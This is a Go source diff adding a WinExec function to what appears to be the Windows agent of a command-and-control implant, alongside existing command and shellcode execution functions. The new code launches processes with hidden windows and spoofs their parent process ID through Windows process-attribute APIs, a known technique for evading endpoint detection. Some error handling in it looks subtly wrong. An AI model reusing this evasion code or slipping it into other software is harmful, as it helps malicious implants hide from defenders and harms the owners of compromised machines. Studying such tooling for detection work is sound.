@@ -28,6 +28,7 @@ import (
 	"os/exec"
 	"syscall"
 	"unsafe"
+    "path/filepath"
 
 	// Sub Repositories
 	"golang.org/x/sys/windows"
@@ -69,7 +70,33 @@ const (
 	TH32CS_SNAPTHREAD = 0x00000004
 	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
 	THREAD_SET_CONTEXT = 0x0010
+
+    // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS is a Windows API constant to denote the Parent Pid attribute
+    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
 )
+
+// Part of the Windows Struct used to spoof parent pid
+type StartupInfoEx struct {
+    windows.StartupInfo
+    AttributeList *PROC_THREAD_ATTRIBUTE_LIST
+}
+
+// Part of the Windows Struct used to spoof parent pid
+type PROC_THREAD_ATTRIBUTE_ENTRY struct {
+    attribute   *uint32
+    cbSize      uintptr
+    lpValue     uintptr
+}
+
+// Part of the Windows Struct used to spoof parent pid
+type PROC_THREAD_ATTRIBUTE_LIST struct {
+    dwFlags     uint32
+    size        uint64
+    count       uint64
+    reserved    uint64
+    unknown     *uint64
+    entries     []*PROC_THREAD_ATTRIBUTE_ENTRY
+}
 
 // ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
 func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
@@ -94,6 +121,165 @@ func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
 
 	return stdout, stderr
 }
+
+// Uses the CreateProccessW() API call to launch a process
+// A negative ppid (-1, specifically) indicates it should just launch without spoofing the parent pid
+func WinExec(prog string, args string, ppid int) (stdout string, stderr string) {
+
+    // Get program path as UTF string
+    progPath, err := exec.LookPath(prog)
+    if err != nil {
+        return "", fmt.Sprintf("Could not find executable %s\r\n", prog)
+    }
+    utfProgPath, err := windows.UTF16PtrFromString(progPath)
+    if err != nil {
+        return "", fmt.Sprintf("Could not convert executable name to UTF: %s\r\n", prog)
+    }
+
+    absPath, err := filepath.Abs(progPath)
+    if err != nil {
+        return "", fmt.Sprintf("Could not find a valid absolute path for executable %s\r\n", progPath)
+    }
+
+    // Command line arguments show a full path to match normal Windows processes 
+    cmdLine := fmt.Sprintf("\"%s\"", absPath)
+    if len(args) > 0 {
+        cmdLine += " " + args
+    }
+
+
+    argPtr, err := windows.UTF16PtrFromString(cmdLine)
+    if err != nil {
+        return "", fmt.Sprintf("Could not parse arguments to UTF string: %s\r\n", args)
+    }
+
+
+    var startupInfo StartupInfoEx
+    var uintParentHandle uintptr
+
+    kernel32 := windows.NewLazySystemDLL("kernel32")
+    procCreateProcessW  := kernel32.NewProc("CreateProcessW")
+    procCloseHandle     := kernel32.NewProc("CloseHandle")
+
+    // To spoof your parent pid, you need a handle to it first
+    if ppid > 0 {
+
+        procInitializeProcThreadAttributeList   := kernel32.NewProc("InitializeProcThreadAttributeList")
+        procGetProcessHeap                      := kernel32.NewProc("GetProcessHeap")
+        procHeapAlloc                           := kernel32.NewProc("HeapAlloc")
+        procHeapFree                            := kernel32.NewProc("HeapFree")
+        procDeleteProcThreadAttributeList       := kernel32.NewProc("DeleteProcThreadAttributeList")
+        procUpdateProcThreadAttribute           := kernel32.NewProc("UpdateProcThreadAttribute")
+
+        // Call InitializeProcThreadAttributeList once to find out how much memory we need
+        var procThreadAttributeSize uintptr
+        _, _, e1 := syscall.Syscall6(procInitializeProcThreadAttributeList.Addr(), 4,
+                uintptr(unsafe.Pointer(nil)),
+                uintptr(1),                                         // Attribute Count
+                uintptr(0),                                         // reserved, must be 0
+                uintptr(unsafe.Pointer(&procThreadAttributeSize)),  // lp size we need to allocate
+                0, 0)
+        if e1 != 0 && e1 != windows.E_NOT_SUFFICIENT_BUFFER {
+            return "", fmt.Sprintf("First call to InitializeProcThreadAttributeList failed: %i\r\n", e1)
+        }
+
+
+        // Get and allocate attributeList in the Heap
+        r0, _, e1 := syscall.Syscall(procGetProcessHeap.Addr(), 0, 0, 0, 0,)
+        procHeap := windows.Handle(r0)
+        if e1 != 0 {
+            return "", fmt.Sprintf("GetProcessHeap failed: %i\r\n", e1)
+        }
+
+        r0, _, e1 = syscall.Syscall(procHeapAlloc.Addr(), 3,
+                uintptr(procHeap),                  // Handle to the heap from above function call
+                uintptr(0),                         // Flags, we don't want them
+                uintptr(procThreadAttributeSize))   // Num of bytes to allocate. Got it above
+        attributeList := uintptr(r0)
+        if attributeList == 0 || e1 != 0 {
+            return "", fmt.Sprintf("HeapAlloc failed: %i\r\n", e1)
+        }
+
+        defer syscall.Syscall(procHeapFree.Addr(), 3, uintptr(procHeap), uintptr(0), uintptr(attributeList))
+
+        // Call InitializeProcThreadAttributeList again to actually get the data
+        startupInfo.AttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
+        _, _, e1 = syscall.Syscall6(procInitializeProcThreadAttributeList.Addr(), 4,
+                uintptr(unsafe.Pointer(startupInfo.AttributeList)), // Attributes
+                uintptr(1),                                         // Num of attributes
+                uintptr(0),                                         // Reserved, must be 0
+                uintptr(unsafe.Pointer(&procThreadAttributeSize)),  // size of attribute list
+                0, 0)
+
+        if e1 != 0 {
+            return "", fmt.Sprintf("Second call to InitializeProcThreadAttributeList failed: %i\r\n", e1)
+        }
+
+        defer syscall.Syscall(procDeleteProcThreadAttributeList.Addr(), 1, uintptr(unsafe.Pointer(startupInfo.AttributeList)), 0, 0)
+
+        // Get the parent handle that we're spoofing
+        parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(ppid))
+        if err != nil {
+            return "", fmt.Sprintf("Error opening process: %s\n", err);
+        }
+
+        defer procCloseHandle.Call(uintptr(parentHandle))
+
+
+        uintParentHandle = uintptr(parentHandle)
+        _, _, e1 = syscall.Syscall9(procUpdateProcThreadAttribute.Addr(), 7,
+            uintptr(unsafe.Pointer(startupInfo.AttributeList)), // Attribute list
+            uintptr(0),                                         // reserved, must be 0
+            uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),      // We're updating the ppid
+            uintptr(unsafe.Pointer(&uintParentHandle)),         // Handle to parent we're spoofing
+            uintptr(unsafe.Sizeof(parentHandle)),               // size of parentHandle
+            uintptr(0),                                         // reserved, must be 0
+            uintptr(unsafe.Pointer(nil)),                       // reserved, must be 0
+            0, 0)
+        if e1 != 0 {
+            return "", fmt.Sprintf("UpdateProcThreadAttribute failed: %i\r\n", e1)
+        }
+    }
+
+    // At last, start the process
+    var procInfo windows.ProcessInformation
+    startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
+    startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
+    startupInfo.ShowWindow = windows.SW_HIDE
+    creationFlags := windows.CREATE_NO_WINDOW
+    if (ppid > 0) {
+        creationFlags |= windows.EXTENDED_STARTUPINFO_PRESENT
+    }
+
+    r1, _, e1 := syscall.Syscall12(procCreateProcessW.Addr(), 10,
+            uintptr(unsafe.Pointer(utfProgPath)),   // executable
+            uintptr(unsafe.Pointer(argPtr)),           // command line //TODO fill this in
+            uintptr(unsafe.Pointer(nil)),           // proc security
+            uintptr(unsafe.Pointer(nil)),           // thread security
+            uintptr(1),                             // Inherit handle
+            uintptr(creationFlags),                 // creationFlags
+            uintptr(unsafe.Pointer(nil)),           // env
+            uintptr(unsafe.Pointer(nil)),           // current Direcotry
+            uintptr(unsafe.Pointer(&startupInfo)),  // startup info
+            uintptr(unsafe.Pointer(&procInfo)),     // out proc info
+            0, 0)
+
+    if r1 == 0 && e1 == 0 {
+        return "", fmt.Sprintf("Failed to create process: %i\r\n", e1)
+    }
+
+    _, _, errCloseHandle := procCloseHandle.Call(uintptr(procInfo.Process))
+    if errCloseHandle.Error() != "The operation completed successfully." {
+        return "", fmt.Sprintf("Error calling CloseHandle: %s\r\n", errCloseHandle.Error())
+    }
+    _, _, errCloseHandle = procCloseHandle.Call(uintptr(procInfo.Thread))
+    if errCloseHandle.Error() != "The operation completed successfully." {
+        return "", fmt.Sprintf("Error calling CloseHandle: %s\r\n", errCloseHandle.Error())
+    }
+
+	return fmt.Sprintf("Success - Launched `%s %s` as pid %d", prog, args, int(procInfo.ProcessId)), ""
+}
+
 
 // ExecuteShellcodeSelf executes provided shellcode in the current process
 func ExecuteShellcodeSelf(shellcode []byte) error {
